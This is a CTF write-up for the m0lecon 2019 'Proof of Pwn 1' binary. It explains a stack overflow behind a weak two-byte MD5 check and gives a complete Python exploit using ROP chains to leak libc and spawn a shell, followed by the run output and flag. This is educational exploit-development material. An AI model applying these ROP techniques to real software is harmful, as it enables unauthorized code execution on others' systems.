# M0lecon CTF 2019 - Proof of Pwn 1

We are given an ELF binary with no stack canaries protections and no PIC.
```
$ checksec proof_of_pwn 
[INFO]:  Opening binary proof_of_pwn

arch                            x86
bits                            64
endian                          little
os                              linux
static                          False
stripped                        True
canary                          False
nx                              True
pic                             False
relocs                          False
sanitiz                         False
```

The vulnerability lies in this function

```c
void __cdecl sub_400BED()
{
  __int64 v0; // [rsp+20h] [rbp-20h]
  __int64 v1; // [rsp+28h] [rbp-18h]
  __int64 v2; // [rsp+30h] [rbp-10h]
  __int64 v3; // [rsp+38h] [rbp-8h]
  __int64 vars0; // [rsp+40h] [rbp+0h]
  __int64 retaddr; // [rsp+48h] [rbp+8h]

  sub_400A68(&v0);
  sub_400ABF(&v0);
  puts("Now give me your block data: ");
  HIDWORD(v3) = read(0, &qword_6020E0, 0x80uLL);
  if ( !(unsigned int)sub_400B14((__int64)&qword_6020E0, SHIDWORD(v3), (__int64)&v0) )
  {
    puts("Go mine somewhere else!!\n");
    exit(1);
  }
  v0 = qword_602100;
  v1 = qword_602108;
  v2 = qword_602110;
  v3 = qword_602118;
  vars0 = qword_602120;
  retaddr = qword_602128; // WE CONTROL THE RETURN POINTER
  puts("Block successfully mined. Bye!\n");
}
```

To reach the ret instruction we need to pass a check, otherwise the program will exit.

```c
signed __int64 __fastcall sub_400B14(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // [rsp+8h] [rbp-98h]
  char v5[16]; // [rsp+20h] [rbp-80h]
  char v6; // [rsp+30h] [rbp-70h]
  int j; // [rsp+98h] [rbp-8h]
  int i; // [rsp+9Ch] [rbp-4h]

  v4 = a3;
  MD5_Init(&v6);
  MD5_Update(&v6, a1, a2);
  MD5_Final(v5, &v6);
  for ( i = 0; i <= 15; ++i )
    printf("%02x", (unsigned __int8)v5[i]);
  putchar(10);
  for ( j = 0; j <= 1; ++j )
  {
    if ( *(_BYTE *)(j + v4) != v5[j] )
      return 0LL;
  }
  return 1LL;
}
```

Since only the first two bytes of the hash are checked we can try to bruteforce it.

We're gonna trigger the vulnerability a first time to execute a short ropchain which will leak an address from the GOT, to compute the libc_base, and then we'll return to our vulnerability.

Now we know the addresses of functions and strings from libc in memory.

We're gonna exploit the vulnerability a second time to hijack the execution to `system("/bin/sh")`

### Exploit
```python
def brute_payload(proof, pay):
	def md5(data):
		import hashlib
		m = hashlib.md5()
		m.update(data)
		return m.hexdigest().encode("utf-8")
	i = 0
	while True:
		pay2 = (pay+str(i).encode("utf-8"))[:128]
		if proof[:4] == md5(pay2)[:4]:
			return pay2
		i += 1

from pwnapi import *

log.level      = 1
libc           = ELF("./libc.so.6")
context.binary = ELF("./proof_of_pwn")
p              = context.getprocess()

proof = p.recvline().split()[-1]
log.info("required proof: {}".format(proof.decode("utf-8")))

rop       = p64(context.binary.findgadgetbystr("pop rdi;ret"))
rop      += p64(context.binary.sym.got.puts)
rop      += p64(context.binary.sym.plt.puts)
rop      += p64(0x00400bed) # check function
payload   = brute_payload(proof, fit({72:rop}))

p.sendafter(b"\n", payload)
p.recvuntil(b"\n\n")

puts      = u64(p.recvline().strip().ljust(8, b"\x00"))
libc_base = puts - libc.sym.puts
system    = libc_base + libc.sym.system
binsh     = libc_base + next(libc.search("/bin/sh"))
log.info("libc base:      0x{:x}".format(libc_base))
log.info("system:         0x{:x}".format(system))
log.info("binsh:          0x{:x}".format(binsh))

proof = p.recvline().split()[-1]
log.info("required proof: {}".format(proof.decode("utf-8")))

rop      = p64(context.binary.findgadgetbystr("pop rdi;ret"))
rop     += p64(binsh)
rop     += p64(system)
rop     += p64(context.binary.findgadgetbystr("mov eax, 0;leave;ret"))
payload  = brute_payload(proof, fit({72:rop}))

p.sendafter(b": \n", payload)
p.recvuntil(b"\n\n")

p.sendline(b"cat flag.txt; exit")
log.info("flag:           {}".format(p.recvall().decode("utf-8")))

p.close()
```

### Output
```
$ python exploit.py     
[INFO]:  Opening binary ./libc.so.6

arch                            x86
bits                            64
endian                          little
os                              linux
static                          False
stripped                        True
canary                          True
nx                              True
pic                             True
relocs                          False
sanitiz                         False

[INFO]:  Opening binary ./proof_of_pwn

arch                            x86
bits                            64
endian                          little
os                              linux
static                          False
stripped                        True
canary                          False
nx                              True
pic                             False
relocs                          False
sanitiz                         False

[INFO]:  Process started with PID 17148 ./proof_of_pwn
[INFO]:  required proof: 289510e3b590959fb0b0177fe57612d3
[INFO]:  libc base:      0x7f10f5e8e000
[INFO]:  system:         0x7f10f5ed3390
[INFO]:  binsh:          0x7f10f601ad57
[INFO]:  required proof: b222d1572a57e35c7416ff32e234f90a
[INFO]:  flag:           ptm{p00r_8rut3f0rc1ng_c4n_h3lp}
[INFO]:  Process 17148 exited with code -7
```

You can download [here](https://github.com/ndaprela/CTF/tree/master/2019/m0lecon/proof_of_pwn1) the challenge and the exploit.
